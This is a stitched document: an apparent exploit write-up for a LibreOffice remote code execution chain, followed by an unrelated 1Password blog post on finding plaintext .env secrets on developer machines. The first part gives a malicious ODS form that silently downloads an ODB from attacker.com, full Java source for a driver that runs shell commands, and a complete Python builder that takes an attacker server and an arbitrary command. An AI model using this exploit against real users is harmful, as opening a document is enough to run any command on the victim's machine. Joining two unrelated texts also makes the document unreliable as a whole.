            form:datasource="http://attacker.com:8888/payload.odb"  // [A] HTTP ODB
            form:command="CALL "evil.Driver.pwn"('open -a Calculator')"
            form:command-type="command"
            form:escape-processing="false">                 // [C] SQL composer bypass
             form:name="Field1"
              form:control-implementation="ooo:com.sun.star.form.component.TextField"
              form:id="control1">
              
                 form:property-name="DefaultControl"
                  form:property-type="string"
                  form:property-value="com.sun.star.form.control.TextField"/>
              
            
          
        
         table:number-columns-repeated="5"/>
        
           office:value-type="string">
            Item
           office:value-type="string">
            Qty
           office:value-type="string">
            Price


Since ODS is a ZIP archive, the malicious evil/Driver.class is embedded directly inside the file at [D]. URLClassLoader treats ZIP files as class containers and loads .class files from them.

poc.ods (ZIP archive)
├── mimetype                         ← ODS magic (uncompressed, first entry)
├── content.xml                      ← form with CALL statement + HTTP datasource
├── styles.xml                       ← spreadsheet styles
├── META-INF/
│   └── manifest.xml                 ← ODF manifest listing all entries
└── evil/
    └── Driver.class                 ← [D] malicious class loaded by URLClassLoader


The ODB payload hosted on the attacker’s server provides the classpath configuration and JDBC settings. It uses bootstrap variables to predict the victim’s file path and points the classpath back to the ODS file on disk:



  
     xlink:href="jdbc:hsqldb:mem:exploit"/>
     db:user-name="SA" db:is-password-required="false"/>
  
   db:java-driver-class="org.hsqldb.jdbcDriver"
    db:java-classpath="vnd.sun.star.expand:$SYSBINDIR/../Resources/java/hsqldb.jar
      vnd.sun.star.expand:$SYSUSERHOME/Downloads/poc.ods
      vnd.sun.star.expand:$SYSUSERHOME/Desktop/poc.ods
      vnd.sun.star.expand:$SYSUSERHOME/Documents/poc.ods"
    db:system-driver-settings=""
    db:parameter-name-substitution="false"/>


Exploit Flow 
1. Attacker: Build exploit files
   ├── poc.ods    → ODS with form auto-load + evil/Driver.class
   └── payload.odb    → ODB with classpath pointing back to poc.ods

2. Attacker: Host payload.odb on HTTP server
   └── python3 -m http.server 8888

3. Victim: Opens poc.ods (or poc.xlsx — content-based detection)

4. LibreOffice processing:
   ├── Parses content.xml
   ├── form:apply-design-mode="false" → auto-load triggered
   ├── form:datasource="http://attacker:8888/payload.odb"
   │   └── HTTP GET → silently downloads payload.odb (no prompt)
   ├── ODB parsed → classpath = $SYSUSERHOME/Downloads/poc.ods
   │   └── setPropertyInfo() not called → classpath preserved    (CVE-2026-104007)
   ├── HSQLDB initialized
   │   └── accessibleJavaMethodNames = null → all methods allowed (CVE-2026-104692)
   ├── form:escape-processing="false" → SQL passed directly
   ├── CALL "evil.Driver.pwn"('open -a Calculator')
   │   ├── URLClassLoader loads evil/Driver.class from poc.ods on disk
   │   └── evil.Driver.pwn() → Runtime.getRuntime().exec()
   └── Code execution — opening the document is enough

5. Result: Arbitrary command execution as the victim's user


Platform-Specific Behavior

On macOS and Windows, the exploit uses the HSQLDB CALL path: the form’s SQL command directly invokes evil.Driver.pwn() with the command string as an argument.

On Linux, the exploit demonstrates that CVE-2026-104007 alone is sufficient for RCE: evil.Driver is registered as the JDBC driver class in the ODB, and its connect() method is invoked automatically during connection setup. The command is embedded in the JDBC URL as jdbc:evil:. This Driver.connect() approach would work on all platforms even if the HSQLDB whitelist were applied, because driver class loading and connect() invocation do not go through supportsJavaMethod().

// evil/Driver.java — connect() path (Linux)
// Driver class loading triggers connect() automatically during JDBC connection setup.
// The command is extracted from the JDBC URL prefix "jdbc:evil:".
public Connection connect(String url, Properties info) throws SQLException {
    if (url != null && url.startsWith("jdbc:evil:")) {
        pwn(url.substring(10));  // extract command from URL
    }
    return null;
}


evil/Driver.java

The malicious JDBC driver implements the CALL path via pwn() and the connect() path (demonstrated on Linux).

package evil;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Properties;

public class Driver implements java.sql.Driver {
    public static String pwn(String cmd) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] command;
            if (os.contains("win")) {
                command = new String[]{"cmd.exe", "/c", cmd};
            } else if (os.contains("mac")) {
                command = new String[]{"/bin/sh", "-c", cmd};
            } else {
                command = new String[]{"/bin/sh", "-c", cmd};
            }
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            return e.toString();
        }
        return "ok";
    }

    public Connection connect(String url, Properties info) throws SQLException {
        if (url != null && url.startsWith("jdbc:evil:")) {
            pwn(url.substring(10));
        }
        return null;
    }
    public boolean acceptsURL(String url) throws SQLException { return url != null && url.startsWith("jdbc:evil:"); }
    public java.sql.DriverPropertyInfo[] getPropertyInfo(String url, Properties info) throws SQLException { return new java.sql.DriverPropertyInfo[0]; }
    public int getMajorVersion() { return 1; }
    public int getMinorVersion() { return 0; }
    public boolean jdbcCompliant() { return false; }
    public java.util.logging.Logger getParentLogger() { return null; }
}


Full Exploit 
#!/usr/bin/env python3
"""
Usage:
    python3 build_exploit.py --server  --target 
    cd output && python3 -m http.server 8888

    --server    Attacker HTTP server address (e.g. 192.168.1.100:8888)
    --target    Target platform: macos | linux | windows | all
    --filename  ODS filename the victim will open (default: poc.ods)
    --cmd       Custom command to execute (overrides platform default)
    --outdir    Output directory (default: ./output)
"""

import argparse
import io
import os
import struct
import sys
import zipfile
from pathlib import Path

# ── Calculator commands per platform ──
CALC_COMMANDS = {
    "macos":   "open -a Calculator",
    "linux":   "gnome-calculator || kcalc || xcalc || mate-calc || xfce4-calculator || galculator || qalculate-gtk",
    "windows": "calc.exe",
}

# ── Classpath search paths per platform ──
# URLClassLoader silently ignores paths that don't exist,
# so we list multiple common download locations.
CLASSPATH_PATHS = {
    "macos": [
        "$SYSUSERHOME/Downloads/{filename}",
        "$SYSUSERHOME/Desktop/{filename}",
        "$SYSUSERHOME/Documents/{filename}",
    ],
    "linux": [
        "file://$/Downloads/{filename}",
        "file://$/Desktop/{filename}",
        "file://$/Documents/{filename}",
        "file://$/다운로드/{filename}",
    ],
    "windows": [
        "$SYSUSERHOME/../Downloads/{filename}",
        "$SYSUSERHOME/../Desktop/{filename}",
        "$SYSUSERHOME/{filename}",
    ],
}

# ── hsqldb.jar path per platform ──
HSQLDB_PATHS = {
    "macos":   "vnd.sun.star.expand:$SYSBINDIR/../Resources/java/hsqldb.jar",
    "linux":   "vnd.sun.star.expand:$SYSBINDIR/classes/hsqldb.jar",
    "windows": "vnd.sun.star.expand:$SYSBINDIR/classes/hsqldb.jar",
}

# ── Precompiled evil/Driver.class ──
# Cross-platform: detects OS at runtime via os.name, uses /bin/sh or cmd.exe
# Source: evil/Driver.java (included in this directory)
EVIL_DRIVER_CLASS = None  # loaded from file

def load_evil_class():
    """Load the precompiled evil/Driver.class from the script's directory."""
    script_dir = Path(__file__).parent
    class_path = script_dir / "evil" / "Driver.class"
    if not class_path.exists():
        print(f"[!] evil/Driver.class not found at {class_path}")
        print("    Compile it: javac evil/Driver.java")
        sys.exit(1)
    return class_path.read_bytes()

def build_classpath(target: str, filename: str) -> str:
    """Build the space-separated classpath string for the ODB."""
    parts = [HSQLDB_PATHS[target]]
    for tmpl in CLASSPATH_PATHS[target]:
        path = tmpl.format(filename=filename)
        parts.append(f"vnd.sun.star.expand:{path}")
    return " ".join(parts)

def xml_escape(s: str) -> str:
    """Escape for XML attribute values."""
    return s.replace("&", "&").replace('"', """).replace("'", "'")\
           .replace("<", "<").replace(">", ">")

def build_odb(target: str, filename: str, command: str, evil_class: bytes) -> bytes:
    """Build the ODB payload ZIP."""
    classpath = build_classpath(target, filename)

    manifest_xml = '\n' \
        '\n' \
        '   \
        'manifest:media-type="application/vnd.oasis.opendocument.base"/>\n' \
        '   \
        'manifest:media-type="text/xml"/>\n' \
        '   \
        'manifest:media-type="text/xml"/>\n' \
        ''

    settings_xml = '\n' \
        ' \
        'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" ' \
        'office:version="1.3">'

    if target == "linux":
        driver_class = "evil.Driver"
        jdbc_url = f"jdbc:evil:{xml_escape(command)}"
    else:
        driver_class = "org.hsqldb.jdbcDriver"
        jdbc_url = "jdbc:hsqldb:mem:exploit"

    content_xml = f'''

  
    
      
        
          {jdbc_url}"/>
          
        
        {driver_class}"
          db:java-classpath="{xml_escape(classpath)}"
          db:system-driver-settings=""
          db:parameter-name-substitution="false"/>
        
          
            
              %
            
          
        
      
    
  
'''

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("META-INF/manifest.xml", manifest_xml)
        zf.writestr("settings.xml", settings_xml)
        zf.writestr("content.xml", content_xml)
        zf.writestr("evil/Driver.class", evil_class)
    return buf.getvalue()

def build_ods(server_url: str, command: str, evil_class: bytes,
              odb_name: str = "payload.odb") -> bytes:
    """Build the victim ODS file."""
    odb_url = f"http://{server_url}/{odb_name}"

    manifest_xml = '\n' \
        ' \
        'manifest:version="1.3">\n' \
        '   \
        'manifest:media-type=' \
        '"application/vnd.oasis.opendocument.spreadsheet"/>\n' \
        '   \
        'manifest:media-type="text/xml"/>\n' \
        '   \
        'manifest:media-type="text/xml"/>\n' \
        '   \
        'manifest:media-type="application/java-vm"/>\n' \
        ''

    styles_xml = '\n' \
        ' \
        'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" ' \
        'office:version="1.3">\n'

    content_xml = f'''

  
    
      
        
          {xml_escape(odb_url)}"
            form:command="CALL "evil.Driver.pwn"\
('{xml_escape(command)}')"
            form:command-type="command"
            form:escape-processing="false">
            \
"ooo:com.sun.star.form.component.TextField"
              form:id="control1">
              
                \
"com.sun.star.form.control.TextField"/>
              
            
          
        
        
        
          
            Item
          
            Qty
          
            Price
        
        
          
            Consulting Services
          
            40
          
            $150.00
        
        
          
            Development
          
            80
          
            $200.00
        
        
          
            
          
        
      
    
  
'''

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("mimetype")
        info.compress_type = zipfile.ZIP_STORED
        zf.writestr(info, "application/vnd.oasis.opendocument.spreadsheet")
        zf.writestr("content.xml", content_xml,
                     compress_type=zipfile.ZIP_DEFLATED)
        zf.writestr("styles.xml", styles_xml,
                     compress_type=zipfile.ZIP_DEFLATED)
        zf.writestr("META-INF/manifest.xml", manifest_xml,
                     compress_type=zipfile.ZIP_DEFLATED)
        zf.writestr("evil/Driver.class", evil_class,
                     compress_type=zipfile.ZIP_DEFLATED)
    return buf.getvalue()

def main():
    parser = argparse.ArgumentParser(
        description="LibreOffice RCE exploit builder")
    parser.add_argument("--server", required=True,
                        help="Attacker HTTP server (ip:port)")
    parser.add_argument("--target", required=True,
                        choices=["macos", "linux", "windows", "all"])
    parser.add_argument("--filename", default="poc.ods")
    parser.add_argument("--cmd", default=None)
    parser.add_argument("--outdir", default="./output")
    args = parser.parse_args()

    evil_class = load_evil_class()
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    targets = (["macos", "linux", "windows"]
               if args.target == "all" else [args.target])

    for target in targets:
        command = args.cmd or CALC_COMMANDS[target]
        suffix = f"_{target}" if len(targets) > 1 else ""
        odb_name = f"payload{suffix}.odb"

        odb_data = build_odb(target, args.filename, command, evil_class)
        odb_path = outdir / odb_name
        odb_path.write_bytes(odb_data)

        ods_data = build_ods(args.server, command, evil_class, odb_name)
        ods_name = (args.filename if len(targets) == 1
                    else f"{Path(args.filename).stem}_{target}.ods")
        ods_path = outdir / ods_name
        ods_path.write_bytes(ods_data)

        print(f"[+] {target}:")
        print(f"    ODS: {ods_path} ({len(ods_data)} bytes)")
        print(f"    ODB: {odb_path} ({len(odb_data)} bytes)")
        print(f"    CMD: {command}")
        print()

    print(f"[*] Serve payloads:")
    print(f"    cd {outdir} && python3 -m http.server "
          f"{args.server.split(':')[-1]}")
    print()
    print(f"[*] Exploit flow:")
    print(f"    1. Victim opens {args.filename}")
    print(f"    2. LO auto-downloads ODB from http://{args.server}/")
    print(f"    3. HSQLDB loads evil class from {args.filename} on disk")
    print(f"    4. RCE")

if __name__ == "__main__":
    main()

items.title: After the harvest: Find and secure developer secrets without slowing developers down

The credentials they find can determine how fast and how far they move into other systems. AI is compressing that timeline, and developer machines are where many of those credentials sit. Finding exposed credentials is only half of the job. The harder part is fixing them without disrupting the way developers work. In this post we’ll cover how 1Password Developer Watchtower and 1Password Environments help teams find, replace, and manage developer secrets. The riskiest copy of a secret is usually the one on disk For many developers, the fastest place to put a secret is a local .env file. It is familiar, supported by the tools they already use, and usually stored in plaintext. Even when teams provide dedicated secrets tooling, it can feel slow and disconnected from the workflow, so the familiar path wins. That habit feeds secret sprawl, and the numbers are moving the wrong way. GitGuardian's 2026 State of Secrets Sprawl report found 28.65 million new secrets in public GitHub commits in 2025, up 34% from the previous year. Leaked secrets for AI services grew 81% in a single year. For security teams, the bigger problem is visibility. A plaintext credential on a laptop is harder to monitor, rotate, revoke, or trace to the systems that depend on it. And now that AI coding assistants can access project files and run terminal commands, those credentials may be readable by more than the developer who created them. Secure developer secrets with 1Password That is the gap 1Password is closing with 1Password Environments and Developer Watchtower. They help teams find improperly stored developer credentials, secure them where employees already trust, and let developers keep using them without slowing down work. Developer Watchtower finds plaintext developer credentials on local devices, including .env files, and guides users to import them into 1Password Developer credential visibility for admins adds reporting and remediation workflows so that security teams can see credential risk across the organization 1Password Environments gives developers a secure place to store, share, and use the secrets behind apps, services, automations, and AI-assisted workflows Together, they give developers a safer way to use the credentials their work depends on, and give security teams the visibility and control to act before those credentials spread. Developer Watchtower: Find secrets sitting on your local disk Developer Watchtower already identified plaintext SSH keys on a developer's device. It now also covers .env files, one of the most common places secrets end up during local development. When the 1Password desktop app finds credentials in a local .env file, the developer gets an alert explaining the risk and offering a one-click import into 1Password Environments. The alert lets the user know which secrets may be exposed and makes it easy to move the secret into a secure 1Password vault. For security teams, credentials that were invisible on local devices become something you can manage, share, govern, and remediate. Admins get a new report, local disk exposure, showing the plaintext .env files and SSH keys the desktop app found on local disks. With Developer Watchtower, admins can see which users and devices are affected without seeing the secret itself. That keeps the underlying value from being exposed and lets developers replace the credential without breaking the workflow. 1Password Environments: Keep the workflow, lose the plaintext secrets 1Password Environments is built into the desktop app. It gives developers a familiar place to store API keys, access tokens, database passwords, cloud credentials, and environment variables their apps need without leaving plaintext secrets in .env files or anywhere else on disk. Instead of reading from a file, the app requests its variables when it needs them and 1Password supplies them. There is no standing .env file for an attacker, or an AI tool with file access, to find. It keeps the one-click convenience that makes .env files appealing, backed by 1Password's security. Developers don’t need to rebuild workflows to use managed secrets. With 1Password Environments you can: Import an existing .env file or add variables manually, organized by app, service, project, or stage Use the 1Password CLI and SDKs with the tools you already rely on, with local desktop authentication such as biometrics where available Connect service accounts to support automation Use supported AI coding workflows with managed secrets through 1Password's MCP Server, without copying secrets values into project files or pasting them into the model context For Teams and Business customers, Environments fits into the access controls you already use in 1Password. With security built into the workflows developers use, the habits that created exposure can also be the ones that fix it. items.summary_html:
In our first post on credential harvesting, we looked at what happens after an attacker gets inside an environment. The credentials they find can determine how fast and how far they move into other systems. AI is compressing that timeline, and developer machines are where many of those credentials sit.

Finding exposed credentials is only half of the job. The harder part is fixing them without disrupting the way developers work. In this post we’ll cover how 1Password Developer Watchtower and 1Password Environments help teams find, replace, and manage developer secrets.

The riskiest copy of a secret is usually the one on disk

For many developers, the fastest place to put a secret is a local .env file. It is familiar, supported by the tools they already use, and usually stored in plaintext. Even when teams provide dedicated secrets tooling, it can feel slow and disconnected from the workflow, so the familiar path wins.

That habit feeds secret sprawl, and the numbers are moving the wrong way. GitGuardian's 2026 State of Secrets Sprawl report found 28.65 million new secrets in public GitHub commits in 2025, up 34% from the previous year. Leaked secrets for AI services grew 81% in a single year.

For security teams, the bigger problem is visibility. A plaintext credential on a laptop is harder to monitor, rotate, revoke, or trace to the systems that depend on it. And now that AI coding assistants can access project files and run terminal commands, those credentials may be readable by more than the developer who created them.

Secure developer secrets with 1Password

That is the gap 1Password is closing with 1Password Environments and Developer Watchtower. They help teams find improperly stored developer credentials, secure them where employees already trust, and let developers keep using them without slowing down work.

  • Developer Watchtower finds plaintext developer credentials on local devices, including .env files, and guides users to import them into 1Password

  • Developer credential visibility for admins adds reporting and remediation workflows so that security teams can see credential risk across the organization

  • 1Password Environments gives developers a secure place to store, share, and use the secrets behind apps, services, automations, and AI-assisted workflows

Together, they give developers a safer way to use the credentials their work depends on, and give security teams the visibility and control to act before those credentials spread.

Developer Watchtower: Find secrets sitting on your local disk

Developer Watchtower already identified plaintext SSH keys on a developer's device. It now also covers .env files, one of the most common places secrets end up during local development.

When the 1Password desktop app finds credentials in a local .env file, the developer gets an alert explaining the risk and offering a one-click import into 1Password Environments. The alert lets the user know which secrets may be exposed and makes it easy to move the secret into a secure 1Password vault.

For security teams, credentials that were invisible on local devices become something you can manage, share, govern, and remediate. Admins get a new report, local disk exposure, showing the plaintext .env files and SSH keys the desktop app found on local disks. With Developer Watchtower, admins can see which users and devices are affected without seeing the secret itself. That keeps the underlying value from being exposed and lets developers replace the credential without breaking the workflow.

1Password Environments: Keep the workflow, lose the plaintext secrets

1Password Environments is built into the desktop app. It gives developers a familiar place to store API keys, access tokens, database passwords, cloud credentials, and environment variables their apps need without leaving plaintext secrets in .env files or anywhere else on disk. Instead of reading from a file, the app requests its variables when it needs them and 1Password supplies them. There is no standing .env file for an attacker, or an AI tool with file access, to find. It keeps the one-click convenience that makes .env files appealing, backed by 1Password's security.

Developers don’t need to rebuild workflows to use managed secrets. With 1Password Environments you can:

  • Import an existing .env file or add variables manually, organized by app, service, project, or stage

  • Use the 1Password CLI and SDKs with the tools you already rely on, with local desktop authentication such as biometrics where available

  • Connect service accounts to support automation

  • Use supported AI coding workflows with managed secrets through 1Password's MCP Server, without copying secrets values into project files or pasting them into the model context

For Teams and Business customers, Environments fits into the access controls you already use in 1Password. You can share an environment with a group instead of adding people one at a time, while admins control whether Environments are available across the organization in the desktop app, CLI, and SDKs.

Start with visibility

Turn on Developer Watchtower and review the Local disk exposure report. Assume any credential it finds may have been exposed. Revoke or rotate it, then move the replacement into Environments so it doesn’t end up back in a plaintext file.

The aim is to make the secure path the fast path. With security built into the workflows developers use, the habits that created exposure can also be the ones that fix it.

If you already use 1Password, Developer Watchtower is available at no extra cost. Explore Developer Watchtower, or see how to set up these features in the 1Password developer docs.
